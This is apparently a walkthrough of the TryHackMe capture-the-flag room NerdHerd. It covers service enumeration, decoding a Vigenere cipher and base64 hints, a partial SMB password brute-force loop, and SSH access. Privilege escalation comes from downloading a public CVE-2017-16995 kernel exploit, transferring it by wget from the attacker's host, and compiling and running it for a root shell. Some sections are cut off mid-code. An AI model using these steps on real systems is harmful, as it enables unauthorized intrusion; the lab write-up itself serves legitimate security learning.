NerdHerd is a medium rated TryHackMe room by [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd). At first few files were found on the ftp server which had anonymous login enabled from which a ciphertext was extracted, and the key for that ciphertext was found from webserver running on port 1337. Then with the decoded password and username enumerated from enum4linux, share hosted on smb was accessed which leads to the SSH credential for user chuck. On the box, the version of kernel was old and kernel exploit was done to get root shell on the box.

We have quite a few ports open. FTP is running on port 21, which has anonymous login enabled. SSH is running on port 22 and the looking a the banner, it is an ubuntu box and searching about the version of OpenSSH, the box might be an ubuntu xenial. SMB is running on port 445 and HTTP sevice on port 1337.

Here the interesting thing that I found is the Owner name, ie **fijbxslz**, which looks kind of strange. So, I checked online if it was any kind of a ciphertext.
Checking the cipher on [this](https://www.boxentriq.com/code-breaking/cipher-identifier) site, it said it might be a vigenere cipher. But to able to crack the cipher, we need the key.

## Contents of hellon3rd.txt
```console
local@local:~/Documents/tryhackme/nerdherd$ cat hellon3rd.txt 
all you need is in the leet
```
Looking at the content of hellon3rd.txt, the key to decode this cipher might be on the webserver that is running on port 1337.

## HTTP on port 1337
![3](/assets/images/thm/nerdherd/3.png)

It has the default page for apache.

## Looking at the source
```html
....
  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

<!--
	hmm, wonder what i hide here?
 -->
 ...

  div.table_of_contents_item a:active {
    color: #000000;
  }

<!--
	maybe nothing? :)
 -->

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }
......
......
          </p>

<!--
	keep digging, mister/ma'am
 -->


          <p>

......
<body onload="alertFunc()">

<script>
function alertFunc() {
  alert("HACKED by 0xpr0N3rd");
  alert("Just kidding silly.. I left something in here for you to find")
}
</script>

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>

</body>
</html>

```
I have only shown the content that is not present on the default apache page. From this page, we find a potential username **0xpr0N3rd** and a link to a youtube video on the bottom which says might contain the answer. 
So, I went to the link and watched the video. The title for the video is _The Trashmen - Surfin Bird - Bird is the Word 1963 (RE-MASTERED) (ALT End Video) (OFFICIAL VIDEO)_.

### Portion of lyrics of the song
```
A-well-a everybody's heard about the bird!
Bird bird bird, b-bird's the word
A-well-a bird bird bird, bird is the word
A-well-a bird bird bird, well-a bird is the word
A-well-a bird bird bird, b-bird's the word
A-well-a bird bird bird, well-a bird is the word
A-well-a bird, bird, b-bird's the word
A-well-a bird bird bird, b-bird's the word
A-well-a bird bird bird, well-a bird is the word
A-well-a bird, bird, b-bird's the word
```
Surely the song focuses on the bird a lot and I thought well that might be the key that I am looking for.

### Decrypting the cipher
With key as **bird**, the ciphertext **fijbxslz** gives the plaintext **easywkuw**. Looking at the plaintext, the key might be incomplete as a portion is correctly decoded but not all of it. So, I used **birdistheword** as the key and with that as key the plaintext becomes **<redacted>**. Now, that looks like a password but we dont know what it is for.

## Checking /admin

![4](/assets/images/thm/nerdherd/4.png)

### Checking the source
```html
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```
They look like a key:pass pairs and encoded in using base64.

**Spoiler alert: Rabbit Hole**

### Decoded content
```console
local@local:~/Documents/tryhackme/nerdherd$ echo Y2liYXJ0b3dza2k= | base64 -d
cibartowski
local@local:~/Documents/tryhackme/nerdherd$ echo aGVoZWdvdTwdasddHlvdQ== | base64 -d
hehegou<j][base64: invalid input
```
We get a potential username but it errors out while decoding the password. Then I tweaked around to make it a valid base64 string.

```console
local@local:~/Documents/tryhackme/nerdherd$ echo aGVoZWdvdTwdasddHlvdQ=== | base64 -d
hehegou<j][base64: invalid input
local@local:~/Documents/tryhackme/nerdherd$ echo aGVoZWdvdTwdasddHlvdQ= | base64 -d
hehegou<j][base64: invalid input
local@local:~/Documents/tryhackme/nerdherd$ echo aGVoZWdvdTwdasddHlvdQ | base64 -d
hehegou<j][base64: invalid input
local@local:~/Documents/tryhackme/nerdherd$ echo aGVoZWdvdTwdasddHlvd | base64 -d
hehegou<j][
```
I also ran gobuster using multiple extensions and with multiple wordlist but I did not find anything.

Now at this point,we have a few usernames and passwords.
#### Usernames
```
cibartowski
0xpr0N3rd
```

### Passwords
```
hehegou<j][
<redacted>
```
And, we still have a service to enumerate. ie SMB

## SMB service on Port 445
```console
local@local:~/Documents/tryhackme/nerdherd$ smbclient -N -L 10.10.62.119

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        nerdherd_classified Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
We do have a share called nerdherd_classified.

## Checking the share permissions
```console
local@local:~/Documents/tryhackme/nerdherd$ smbmap -H 10.10.62.119 -u anonymous  -p anonymous
[+] Finding open SMB ports....
[!] Authentication error on 10.10.62.119
[!] Authentication error on 10.10.62.119
```
But no matter how much I try, no shares were listed using smbmap and same goes for crackmapexec.

## Checking the share nerdherd_classified
```console
local@local:~/Documents/tryhackme/nerdherd$ smbclient -N  \\\\10.10.62.119\\nerdherd_classified
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Looks like without the valid username and password, we cant list the share content. As I couldnot bruteforce the SMB using crackmapexec, I have to do all the things manually. So, I created a bunch of passwords from the ill base64 string, thinking that one character at the end might be missing or corrupted. Also I created a custom wordlists from the webserver's content.

                echo $pass | smbclient -U $user \\\\10.10.62.119\\nerdherd_classified ;
        done
done
```
### Executing the script
```console
local@local:~/Documents/tryhackme/nerdherd$ bash brute.sh 
Enter WORKGROUP\cibartowski's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED

```
But there was no any success. So, I turned my focus on the webserver to check if I missed anything but I didnot find that much on the webserver too.
Then after a while, I began to think if the usernames that I had are not the real username on the box.

### Content of creds.txt
```console
local@local:~/Documents/tryhackme/nerdherd$ curl 10.10.62.119:1337/this******0ry/creds.txt
alright, enough with the games.

here, take my ssh creds:

        chuck : th1******a5s
```
Finally we get the SSH creds for the user chuck.

## Shell as Chuck
```console
local@local:~/Documents/tryhackme/nerdherd$ ssh chuck@10.10.62.119

# Privilege Escalation

### Listing the groups
```console
chuck@nerdherd:~$ groups
chuck adm cdrom sudo dip plugdev lpadmin sambashare
```
User chuck is in the sudo group, which means we can easily get the root shell.

```console
chuck@nerdherd:~$ sudo su -
[sudo] password for chuck: 
chuck is not in the sudoers file.  This incident will be reported.
```
But it turned out, there is no entry for sudo group on sudoers file.

### uname -a
```console
chuck@nerdherd:~$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```
Looking at the information, the kernel version in this box is 4.4.0-31. As this is a pretty outdated box, we can root this box using kernel exploits. But the kernel exploits should be last thing to try on the box as it might make the box unstable and could also crash the box. But as this is a ctf enviroment, I thought of giving the kernel exploits a try.

I tried dirty cow at first but it did not work as expected. So I searched for other exploits and found [this](https://dl.packetstormsecurity.net/1807-exploits/cve-2017-16995.c) exploit which worked for me.

### Downloading the exploit
```console
local@local:~/Documents/tryhackme/nerdherd$ wget https://dl.packetstormsecurity.net/1807-exploits/cve-2017-16995.c
```

### Hosting the file using python server
```console
local@local:~/Documents/tryhackme/nerdherd$ ifconfig tun0 | grep -i 'inet '
        inet 10.6.31.213  netmask 255.255.128.0  destination 10.6.31.213
local@local:~/Documents/tryhackme/nerdherd$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Downloading the exploit on the remote box
```console
chuck@nerdherd:~$ wget 10.6.31.213:8000/cve-2017-16995.c
--2020-11-05 10:27:28--  http://10.6.31.213:8000/cve-2017-16995.c

```

### Compiling the exploit using gcc
```console
chuck@nerdherd:~$ which gcc
/usr/bin/gcc
chuck@nerdherd:~$ gcc cve-2017-16995.c -o exploit
```
### Running the exploit
```console
chuck@nerdherd:~$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880017d9a600
[*] Leaking sock struct from ffff88000c879680
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88001e768c00
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88001e768c00
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
# 
```
And we get a root shell.

## Reading the root flag
```console
# bash
root@nerdherd:~# cd /root
root@nerdherd:/root# ls
root.txt
root@nerdherd:/root# cat root.txt 
cmon, wouldnt it be too easy if i place the root flag here?


root@nerdherd:/root# 
```

### Searching the root flag
```console
root@nerdherd:/root# ls -la root.txt 
-rw-r--r-- 1 root root 62 Eyl 14 19:28 root.txt
root@nerdherd:/root# ls -la /home/chuck/user.txt 
-rw-rw-r-- 1 chuck chuck 46 Eyl 14 19:26 /home/chuck/user.txt
```
Looking at both of the flags information, they were modified on Eyl 14 which is september 14 on Turkish. So I searched for the files that were modified around that date.

```console
root@nerdherd:/root# find / -type f -iname '*txt' -newermt 2020-09-13 ! -newermt 2020-09-15 -exec grep -i thm\{ {} \; 2>/dev/null
THM{5c5b7************************1be693}
THM{7fc91d7************************661be}
```

And we find another flag.

### Reading Bonus flag 
I searched for the bonus flag a lot but couldnot find it. Then looking at the hint, it point something to the history and there was a .bash_history in the home of our root user.

```console
root@nerdherd:/root# cat .bash_history | grep -i -a thm
THM{a975c295************************fc88207}
```
At last I want to thank the creator of the box [0xpr0N3rd](https://tryhackme.com/p/0xpr0N3rd) for the hints and pulling me out of the rabbit hole with the password bruteforcing.
